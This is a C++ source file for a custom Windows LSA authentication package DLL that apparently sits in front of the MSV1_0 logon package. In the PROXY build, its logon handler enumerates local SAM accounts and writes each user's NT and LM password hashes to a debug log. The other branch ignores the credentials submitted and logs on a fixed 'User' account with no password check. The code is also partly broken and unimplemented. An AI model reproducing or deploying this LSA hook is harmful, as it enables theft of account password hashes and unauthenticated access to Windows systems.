// ProxySPPAP.cpp: определяет экспортированные функции для приложения DLL.
//

#include "stdafx.h"

EXTERN_C_START

#include "internals.h"
#include "sam.h"
#include <LM.h>
#include <DsGetDC.h>
#include "defines.h"
#include "ntsam.h"

NTSTATUS NTAPI LsaApInitializePackage (
	_In_ ULONG AuthenticationPackageId,
	_In_ PLSA_DISPATCH_TABLE LsaDispatchTable,
	_In_opt_ PLSA_STRING Database,
	_In_opt_ PLSA_STRING Confidentiality,
	_Out_ PLSA_STRING *AuthenticationPackageName
	)
{
	NTSTATUS status = S_OK;
	LOG_FUNCTION_CALL();

	UNREFERENCED_PARAMETER(AuthenticationPackageId);
	UNREFERENCED_PARAMETER(Database);
	UNREFERENCED_PARAMETER(Confidentiality);
	
	pLsaDispatch = LsaDispatchTable;
	/*LOG_TRACE(L"MsvLsaApInitializePackage");
	status = (MsvLsaApInitializePackage)(
		AuthenticationPackageId,
		LsaDispatchTable,
		Database,
		Confidentiality,
		AuthenticationPackageName
	);
	if (S_OK != status)
	{
		LOG_ERROR(L"Call MSV InitializePackage");
		goto Cleanup;
	}
	LOG_TRACE(L"OK");

	if (NULL != *AuthenticationPackageName)
	{
		LSA_FREE_HEAP(*AuthenticationPackageName);
	}
*/
	LOG_TRACE(L"AllocateLsaStringLsa");
	*AuthenticationPackageName = AllocateLsaStringLsa(NTLKAP_NAME_A);

	if (NULL == *AuthenticationPackageName)
	{
		status = STATUS_NO_MEMORY;
		LOG_ERROR(L"Can't allocate memory of authentication package name");
	}
	if (SamAllocateResource() != S_OK)
	{
		LOG_ERROR(L"Can't allocate resource for SAM DB");
		return STATUS_NOT_IMPLEMENTED;
	}

//Cleanup:
	LOG_TRACE(L"END FUNCTION");
	return status;
}

NTSTATUS NTAPI LsaApCallPackage(
	_In_ PLSA_CLIENT_REQUEST ClientRequest,
	_In_reads_bytes_(SubmitBufferLength) PVOID ProtocolSubmitBuffer,
	_In_ PVOID ClientBufferBase,
	_In_ ULONG SubmitBufferLength,
	_Outptr_result_bytebuffer_(*ReturnBufferLength) PVOID *ProtocolReturnBuffer,
	_Out_ PULONG ReturnBufferLength,
	_Out_ PNTSTATUS ProtocolStatus
)
{
	UNREFERENCED_PARAMETER(ClientRequest);
	UNREFERENCED_PARAMETER(ProtocolSubmitBuffer);
	UNREFERENCED_PARAMETER(ClientBufferBase);
	UNREFERENCED_PARAMETER(SubmitBufferLength);
	UNREFERENCED_PARAMETER(ProtocolReturnBuffer);
	UNREFERENCED_PARAMETER(ReturnBufferLength);
	UNREFERENCED_PARAMETER(ProtocolStatus);

	return E_NOTIMPL;
}

VOID NTAPI LsaApLogonTerminated(
	_In_ PLUID LogonId
)
{
	UNREFERENCED_PARAMETER(LogonId);
	//(*MsvLsaApLogonTerminated)(LogonId);
}

NTSTATUS LsaApLogonUserEx2(
	_In_ PLSA_CLIENT_REQUEST ClientRequest,
	_In_ SECURITY_LOGON_TYPE LogonType,
	_In_reads_bytes_(SubmitBufferSize) PVOID ProtocolSubmitBuffer,
	_In_ PVOID ClientBufferBase,
	_In_ ULONG SubmitBufferSize,
	_Outptr_result_bytebuffer_(*ProfileBufferSize) PVOID *ProfileBuffer,
	_Out_ PULONG ProfileBufferSize,
	_Out_ PLUID LogonId,
	_Out_ PNTSTATUS SubStatus,
	_Out_ PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
	_Outptr_ PVOID *TokenInformation,
	_Out_ PUNICODE_STRING *AccountName,
	_Out_ PUNICODE_STRING *AuthenticatingAuthority,
	_Out_ PUNICODE_STRING *MachineName,
	_Out_ PSECPKG_PRIMARY_CRED PrimaryCredentials,
	_Outptr_ PSECPKG_SUPPLEMENTAL_CRED_ARRAY * SupplementalCredentials
)
{
#ifdef PROXY
	CHECK_STATUS_INIT(S_OK);
	HMODULE hModule = LoadLibraryA("samlib");
	auto SamConnect = (PSAM_CONNECT)GetProcAddress(hModule, "SamConnect");
	auto SamOpenDomain = (PSAM_OPEN_DOMAIN)GetProcAddress(hModule, "SamOpenDomain");
	auto SamOpenUser = (PSAM_OPEN_USER)GetProcAddress(hModule, "SamOpenUser");
	auto SamQueryInformationUser = (PSAM_QUERY_INFO_USER)GetProcAddress(hModule, "SamQueryInformationUser");
	auto SamEnumerateUsersInDomain = (PSAM_ENUMERATE_USERS_IN_DOMAIN)GetProcAddress(hModule, "SamEnumerateUsersInDomain");
	//auto SamLookupDomainInSamServer = (PSAM_LOOKUP_DOMAIN_IN_SERVER)GetProcAddress(hModule, "SamLookupDomainInSamServer");
	auto SamCloseHandle = (PSAM_CLOSE_HANDLE)GetProcAddress(hModule, "SamCloseHandle");
	auto SamFreeMemory = (PSAM_FREE_MEMORY)GetProcAddress(hModule, "SamFreeMemory");
	LSA_HANDLE							handlePolicy = NULL;
	SAM_HANDLE							SamHandle = NULL;
	SAM_HANDLE							SamUserHandle = NULL;
	SAM_HANDLE							SamDomainHandle = NULL;
	OBJECT_ATTRIBUTES					ObjectAttributes;
	SECURITY_QUALITY_OF_SERVICE			SecurityQos;
	UNICODE_STRING						DomainName;
	SAM_ENUMERATE_HANDLE				EnumerationContext = 0;
	PBYTE								pbBuffer;
	ULONG								userDomainCount = 0;
	WCHAR								wszComputer[256*sizeof(WCHAR)];
	ULONG								dwLen = sizeof(wszComputer) / sizeof(wszComputer[0]);

	GetComputerNameW(wszComputer, &dwLen);
	DomainName.Buffer = wszComputer;
	DomainName.Length = (USHORT)wcslen(wszComputer);
	DomainName.MaximumLength = DomainName.Length + 1;

	LSA_OBJECT_ATTRIBUTES objectAttributes;
	memset(&objectAttributes, NULL, sizeof(objectAttributes));
	PPOLICY_ACCOUNT_DOMAIN_INFO ptrPolicyDomainInfo;

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, 0, NULL);
	ObjectAttributes.SecurityQualityOfService = &SecurityQos;

	SecurityQos.Length = sizeof(SecurityQos);
	SecurityQos.ImpersonationLevel = SECURITY_MAX_IMPERSONATION_LEVEL;
	SecurityQos.ContextTrackingMode = SECURITY_STATIC_TRACKING;
	SecurityQos.EffectiveOnly = FALSE;


	if (hModule == NULL)
	{
		LOG_ERROR(L"Load library SAMLIB.DLL going fail");
		goto Cleanup;
	}
	int i;
	if (NT_SUCCESS(CHECK_STATUS_VAR = LsaOpenPolicy(NULL, &objectAttributes, POLICY_ALL_ACCESS, &handlePolicy)))
	{
		if (NT_SUCCESS(CHECK_STATUS_VAR = LsaQueryInformationPolicy(handlePolicy, PolicyLocalAccountDomainInformation, reinterpret_cast<PVOID *>(&ptrPolicyDomainInfo))))
		{
			if (NT_SUCCESS(CHECK_STATUS_VAR = SamConnect(NULL, &SamHandle, SAM_SERVER_EXECUTE | SAM_SERVER_ENUMERATE_DOMAINS, (POBJECT_ATTRIBUTES)&objectAttributes)))
			{
				LOG_DEBUG(L"DomainName: %s\n", ptrPolicyDomainInfo->DomainName.Buffer);
				if (NT_SUCCESS(CHECK_STATUS_VAR = SamOpenDomain(SamHandle, MAXIMUM_ALLOWED, ptrPolicyDomainInfo->DomainSid, &SamDomainHandle)))
				{
					NTSTATUS EnumerateStatus;
					printf_s("SamOpenDomain: OK! HANDLE: %p\n", SamDomainHandle);
					do {
						EnumerateStatus = SamEnumerateUsersInDomain(SamDomainHandle, &EnumerationContext, USER_NORMAL_ACCOUNT, (PVOID*)&pbBuffer, 10, &userDomainCount);

						LOG_DEBUG(L"userDomainCount: %lu\n", userDomainCount);
						LOG_DEBUG(L"EnumerationContext: %lu\n", EnumerationContext);

						PSAM_RID_ENUMERATION userShortInfo = (PSAM_RID_ENUMERATION)(pbBuffer);
						if (!userShortInfo)
						{
							printf_s("Error SamEnumerateUsersInDomain. index: %hu, status:0x%08X\n", EnumerationContext, CHECK_STATUS_VAR);
							goto Cleanup;
						}

						LOG_DEBUG(L"UserName: %s\n", userShortInfo->Name.Buffer);
						LOG_DEBUG(L"UserId: %lu\n", userShortInfo->RelativeId);

						if (NT_SUCCESS(CHECK_STATUS_VAR = SamOpenUser(SamDomainHandle, MAXIMUM_ALLOWED, userShortInfo->RelativeId, &SamUserHandle)))
						{
							PVOID pbBufferInfo = NULL;
							for (i = 0; i < 10; i++) {
								LOG_TRACE(L"*******************************%d********************************", i);
								if (NT_SUCCESS(CHECK_STATUS_VAR = SamQueryInformationUser(SamUserHandle, UserAllInformation, &pbBufferInfo)))
								{

									PUSER_ALL_INFORMATION pbBufferInfoUser = (PUSER_ALL_INFORMATION)(pbBufferInfo);
									LOG_DEBUG(L"UserName: %s", pbBufferInfoUser->UserName.Buffer);
									LOG_DEBUG(L"FullName: %s\n", pbBufferInfoUser->FullName.Buffer);
									if (pbBufferInfoUser->NtPasswordPresent)
										LOG_DEBUG(L"NtPassword: %s\n", pbBufferInfoUser->NtPassword.Buffer);
									if (pbBufferInfoUser->LmPasswordPresent)
										LOG_DEBUG(L"LmPassword: %s\n", pbBufferInfoUser->LmPassword.Buffer);
									SamFreeMemory(pbBufferInfo);
								}
							}
							SamFreeMemory(pbBuffer);
							SamCloseHandle(SamUserHandle);

						}
					} while (EnumerateStatus == 0x00000105);
					goto OK;
				}
				LOG_ERROR(L"Error SamOpenDomain: 0x%08X\n", CHECK_STATUS_VAR);
				goto Cleanup;
			}
			LOG_ERROR(L"Error SamConnect: 0x%08X\n", CHECK_STATUS_VAR);
			goto Cleanup;
		}
		LOG_ERROR(L"Error LsaQueryInformationPolicy: 0x%08X\n", CHECK_STATUS_VAR);
		goto Cleanup;
	}
	LOG_ERROR(L"Error LsaOpenPolicy: 0x%08X\n", CHECK_STATUS_VAR);
OK:
	if ((*MsvLsaApLogonUserEx2)(
		ClientRequest,
		LogonType,
		ProtocolSubmitBuffer,
		ClientBufferBase,
		SubmitBufferSize,
		ProfileBuffer,
		ProfileBufferSize,
		LogonId,
		SubStatus,
		TokenInformationType,
		TokenInformation,
		AccountName,
		AuthenticatingAuthority,
		MachineName,
		PrimaryCredentials,
		SupplementalCredentials
		) != SEC_E_OK)
	{
		LOG_ERROR(L"[%s]:Не удалось авторизоваться в пакете Msv1_0", __FUNCDNAME__);
		return *SubStatus;
	}
Cleanup:
	FreeLibrary(hModule);
	CHECK_STATUS_EXIT();

#else
	LOG_FUNCTION_CALL();
	CHECK_STATUS_INIT(S_OK);
	UNREFERENCED_PARAMETER(ClientRequest);
	UNREFERENCED_PARAMETER(ClientBufferBase);
	UNREFERENCED_PARAMETER(LogonType);
	UNREFERENCED_PARAMETER(SubStatus);
	UNREFERENCED_PARAMETER(MachineName);
	UNREFERENCED_PARAMETER(PrimaryCredentials);
	UNREFERENCED_PARAMETER(SupplementalCredentials);
	UNREFERENCED_PARAMETER(ProtocolSubmitBuffer);
	UNREFERENCED_PARAMETER(SubmitBufferSize);

	PLSA_TOKEN_INFORMATION_V2 LocalTokenInformation;
	const wchar_t *wszUser = L"User";
	wchar_t wszComputer[DNLEN + 1];
	DWORD dwLen;
	OEM_SAM_HANDLE pSamHandle = NULL;


	LOG_DEBUG(L"Logon (%S) started", __DATE__);

	if (AccountName)
		*AccountName = AllocateUnicodeStringLsa(wszUser);
	
	dwLen = sizeof(wszComputer) / sizeof(wszComputer[0]);
	GetComputerNameW(wszComputer, &dwLen);

	if (AuthenticatingAuthority)
	{
		if (wszComputer[0])
			*AuthenticatingAuthority = AllocateUnicodeStringLsa(wszComputer);
		else
		{
			dwLen = sizeof(wszComputer);
			GetComputerNameW(wszComputer, &dwLen);
			*AuthenticatingAuthority = AllocateUnicodeStringLsa(wszComputer);
		}
	}

	LOG_DEBUG(L"Computer: %s", wszComputer);
	LOG_DEBUG(L"User: %s", wszUser);

	if (!NT_SUCCESS(CHECK_STATUS_VAR = InitSamDatabase(&pSamHandle, wszComputer)))
	{
		LOG_ERROR(L"[0x%16X] Can't initialize sam database", CHECK_STATUS_VAR);
		goto Cleanup;
	}

	LOG_TRACE(L"Local computer authentication");
	if (!NT_SUCCESS(CHECK_STATUS_VAR = SetupUserContext(pSamHandle, wszUser)))
	{
		switch (CHECK_STATUS_VAR)
		{
		case ERROR_ACCESS_DENIED:
			LOG_WARNING(L"User not found (%s): ACCESS DENIED", wszUser);
			break;
		case STATUS_NO_SUCH_USER:
			LOG_WARNING(L"User not found (%s): No such user", wszUser);
			break;
		default:
			LOG_WARNING(L"User not found (%s): Unknown error %08x", wszUser, CHECK_STATUS_VAR);
			break;
		}
		CHECK_STATUS_VAR = STATUS_NO_SUCH_USER;
		goto Cleanup;
	}

	/*if (ui1->usri1_flags&UF_ACCOUNTDISABLE)
	{
		LOG_WARNING(L"Account disabled: ACCOUNT_DISABLED");
		*SubStatus = STATUS_ACCOUNT_DISABLED;
		if (pdi) NetApiBufferFree(pdi);
		if (ui1) NetApiBufferFree(ui1);
		return STATUS_ACCOUNT_RESTRICTION;
	}
	if (ui1->usri1_flags&UF_PASSWORD_EXPIRED)
	{
		LOG_WARNING(L"Password expired: PASSWORD_EXPIRED");
		*SubStatus = STATUS_PASSWORD_EXPIRED;
		if (pdi) NetApiBufferFree(pdi);
		if (ui1) NetApiBufferFree(ui1);
		return STATUS_ACCOUNT_RESTRICTION;
	}
	if (ui1->usri1_flags&(UF_WORKSTATION_TRUST_ACCOUNT | UF_SERVER_TRUST_ACCOUNT | UF_INTERDOMAIN_TRUST_ACCOUNT))
	{
		LOG_WARNING(L"Is a trust account: ACCOUNT_RESTRICTION");
		*SubStatus = STATUS_ACCOUNT_DISABLED;
		if (pdi) NetApiBufferFree(pdi);
		if (ui1) NetApiBufferFree(ui1);
		return STATUS_ACCOUNT_RESTRICTION;
	}*/


	LOG_TRACE(L"AllocateLocallyUniqueId");
	if (!AllocateLocallyUniqueId(LogonId))
	{
		LOG_ERROR(L"AllocateLocallyUniqueId failed (%d)", GetLastError());
		return CHECK_STATUS_VAR;
	}
	
	LOG_TRACE(L"AllocateTokenInformation");
	if (!NT_SUCCESS(CHECK_STATUS_VAR = AllocateTokenInformation(pSamHandle, LsaTokenInformationV2,	(PVOID*)&LocalTokenInformation)))
	{
		LOG_ERROR(L"GetTokenInformationv2 failed (%08x)\n", CHECK_STATUS_VAR);
		return CHECK_STATUS_VAR;
	}

	LOG_TRACE(L"LSA_CREATE_LOGON_SESSION_F");
	if (!NT_SUCCESS(CHECK_STATUS_VAR = LSA_CREATE_LOGON_SESSION_F(LogonId)))
	{
		LOG_ERROR(L"CreateLogonSession failed (%d)", CHECK_STATUS_VAR);
		return CHECK_STATUS_VAR;
	}

	LOG_TRACE(L"ProfileBuffer");
	if (ARGUMENT_PRESENT(ProfileBuffer))
	{
		LOG_TRACE(L"AllocateInteractiveProfile");
		NT_CHECK(
			(AllocateInteractiveProfile(ClientRequest, (PVOID*)&(*ProfileBuffer), ProfileBufferSize, pSamHandle)),
			L"[%80X] Can't allocate profile buffer",
			CHECK_STATUS_VAR
		);
	}

	(*TokenInformationType) = LsaTokenInformationV2;
	(*TokenInformation) = LocalTokenInformation;

	LOG_DEBUG(L"Logon for %s\\%s returned OK", wszComputer, wszUser);
Cleanup:
	LOG_TRACE(L"FreeSamDatabase");
	if (ARGUMENT_PRESENT(pSamHandle))
	{
		FreeSamDatabase(pSamHandle);
	}
	CHECK_STATUS_EXIT();
#endif
}

EXTERN_C_END